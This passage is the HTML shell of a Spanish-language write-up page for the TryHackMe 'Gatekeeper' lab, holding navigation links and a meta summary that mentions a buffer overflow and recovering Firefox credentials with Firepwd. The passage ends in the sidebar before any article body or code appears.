<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href="/main.792daeffe7d8a12ede95e8974e93e63ca3ef7ac12084fd97ce95e017c4d6adeae69d9a532501e69b69c7aefb63af7f69180de06d7d36b74a375717727b9532ca.css" integrity="sha512-eS2u/+fYoS7eleiXTpPmPKPvesEghP2XzpXgF8TWrermnZpTJQHmm2nHrvtjr39pGA3gbX02t0o3Vxdye5Uyyg==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/writeups/tryhackme/gatekeeper/><title>Gatekeeper | d3bo</title><meta name=description content><meta property="og:title" content="Gatekeeper"><meta property="og:description" content="A lo largo del análisis de esta máquina, examinamos un binario y explotamos una vulnerabilidad de Buffer Overflow que nos permitió acceder al servidor. Para realizar la escalada de privilegios, extraímos las credenciales almacenadas en Firefox utilizando la herramienta Firepwd."><meta property="og:type" content="article"><meta property="og:url" content="/writeups/tryhackme/gatekeeper/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2024-06-24T00:00:00+00:00"><meta property="article:modified_time" content="2024-06-24T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary"><meta name=twitter:title content="Gatekeeper"><meta name=twitter:description content="A lo largo del análisis de esta máquina, examinamos un binario y explotamos una vulnerabilidad de Buffer Overflow que nos permitió acceder al servidor. Para realizar la escalada de privilegios, extraímos las credenciales almacenadas en Firefox utilizando la herramienta Firepwd."><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3bo","position":1},{"@type":"ListItem","item":"/writeups/","name":"Writeups","position":2},{"@type":"ListItem","item":"/writeups/tryhackme/","name":"Try Hack Me","position":3},{"@type":"ListItem","name":"Gatekeeper","position":4}]}</script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"></head><body class="single section writeups" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=vanta-bg style=position:absolute;width:100%;height:100%;z-index:-1></div><div id=announcement data-id=global-alert-ed321576fabf52d76f925272710cb364 class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>¡Nuevo writeup de la máquina "<a href=/writeups/hackthebox/unobtainium>Unobtainium</a>" de HackTheBox!</span>
<button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3bo</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Writeups</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/intro/bienvenido/><img src=/writeups/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=false>
HackTheBox</button><div class=collapse id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/unobtainium/><img src=/writeups/hackthebox/unobtainium//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Unobtainium</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/><img src=/writeups/hackthebox/jupiter//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Jupiter</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/enterprise/><img src=/writeups/hackthebox/enterprise//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Enterprise</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/october/><img src=/writeups/hackthebox/october//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>October</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/schooled/><img src=/writeups/hackthebox/schooled//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Schooled</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/ready/><img src=/writeups/hackthebox/ready//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Ready</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/blue/><img src=/writeups/hackthebox/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/><img src=/writeups/hackthebox/bashed-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bashed (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/><img src=/writeups/hackthebox/horizontall-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Horizontall (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/><img src=/writeups/hackthebox/pandora-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pandora (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/><img src=/writeups/hackthebox/toolbox//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Toolbox</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/buff/><img src=/writeups/hackthebox/buff//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Buff</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/tabby/><img src=/writeups/hackthebox/tabby//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tabby</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=true>
TryHackMe</button><div class="collapse show" id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/><img src=/writeups/tryhackme/pickle-rick//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pickle Rick</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/rootme/><img src=/writeups/tryhackme/rootme//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>RootMe</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/><img src=/writeups/tryhackme/chocolate-factory//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chocolate Factory</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/><img src=/writeups/tryhackme/lazy-admin//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Lazy admin</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/><img src=/writeups/tryhackme/agent-sudo//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent sudo</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/><img src=/writeups/tryhackme/brooklyn-nine-nine//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Brooklyn Nine Nine</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/><img src=/writeups/tryhackme/vulnversity//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Vulnversity</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/><img src=/writeups/tryhackme/agent-t//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent T</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/><img src=/writeups/tryhackme/mr.robot//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mr.Robot</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/gallery/><img src=/writeups/tryhackme/gallery//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Gallery</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wgel/><img src=/writeups/tryhackme/wgel//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wgel</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/><img src=/writeups/tryhackme/tomghost//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tomghost</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/develpy/><img src=/writeups/tryhackme/develpy//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Develpy</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/overpass/><img src=/writeups/tryhackme/overpass//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Overpass</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/><img src=/writeups/tryhackme/bounty-hacker//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bounty Hacker</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/><img src=/writeups/tryhackme/wonderland//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wonderland</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/><img src=/writeups/tryhackme/mustacchio//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mustacchio</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/source/><img src=/writeups/tryhackme/source//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Source</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/startup/><img src=/writeups/tryhackme/startup//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Startup</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/team/><img src=/writeups/tryhackme/team//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Team</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/><img src=/writeups/tryhackme/chill-hack//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chill Hack</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/blue/><img src=/writeups/tryhackme/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/writeups/tryhackme/gatekeeper/><img src=/writeups/tryhackme/gatekeeper//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Gatekeeper</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/cyberlens/><img src=/writeups/tryhackme/cyberlens//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Cyberlens</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/liceo/>Liceo</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ccdabd144af006c40e0937d3f87d7afa aria-expanded=false>
VulnHub</button><div class=collapse id=section-ccdabd144af006c40e0937d3f87d7afa><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/vulnhub/brainpan-1/>Brainpan 1</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-21d2fe7c61cab1f4db96535ccdbf2fb9 aria-expanded=false>
Dockerlabs</button><div class=collapse id=section-21d2fe7c61cab1f4db96535ccdbf2fb9><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"></ul></div></li></ul></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3bo</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li><li class=nav-item><a class="nav-link active" href=/writeups/intro/bienvenido/ aria-current=true>Writeups</a></li><li class=nav-item><a class=nav-link href=/ctf/intro/bienvenido/>CTF</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class="content d-none">Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/intro/bienvenido/><img src=/writeups/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=false>
HackTheBox</button><div class=collapse id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/unobtainium/><img src=/writeups/hackthebox/unobtainium//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Unobtainium</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/><img src=/writeups/hackthebox/jupiter//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Jupiter</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/enterprise/><img src=/writeups/hackthebox/enterprise//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Enterprise</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/october/><img src=/writeups/hackthebox/october//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>October</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/schooled/><img src=/writeups/hackthebox/schooled//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Schooled</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/ready/><img src=/writeups/hackthebox/ready//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Ready</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/blue/><img src=/writeups/hackthebox/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/><img src=/writeups/hackthebox/bashed-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Bashed (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/><img src=/writeups/hackthebox/horizontall-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Horizontall (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/><img src=/writeups/hackthebox/pandora-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pandora (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/><img src=/writeups/hackthebox/toolbox//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Toolbox</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/buff/><img src=/writeups/hackthebox/buff//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Buff</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/tabby/><img src=/writeups/hackthebox/tabby//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tabby</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=true>
TryHackMe</button><div class="collapse show" id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/><img src=/writeups/tryhackme/pickle-rick//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Pickle Rick</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/rootme/><img src=/writeups/tryhackme/rootme//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>RootMe</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/><img src=/writeups/tryhackme/chocolate-factory//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chocolate Factory</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/><img src=/writeups/tryhackme/lazy-admin//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Lazy admin</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/><img src=/writeups/tryhackme/agent-sudo//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent sudo</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/><img src=/writeups/tryhackme/brooklyn-nine-nine//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Brooklyn Nine Nine</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/><img src=/writeups/tryhackme/vulnversity//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Vulnversity</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/><img src=/writeups/tryhackme/agent-t//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Agent T</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/><img src=/writeups/tryhackme/mr.robot//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mr.Robot</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/gallery/><img src=/writeups/tryhackme/gallery//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Gallery</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wgel/><img src=/writeups/tryhackme/wgel//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wgel</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/><img src=/writeups/tryhackme/tomghost//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Tomghost</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/develpy/><img src=/writeups/tryhackme/develpy//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Develpy</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/overpass/><img src=/writeups/tryhackme/overpass//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Overpass</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/><img src=/writeups/tryhackme/bounty-hacker//logo.png alt=Logo 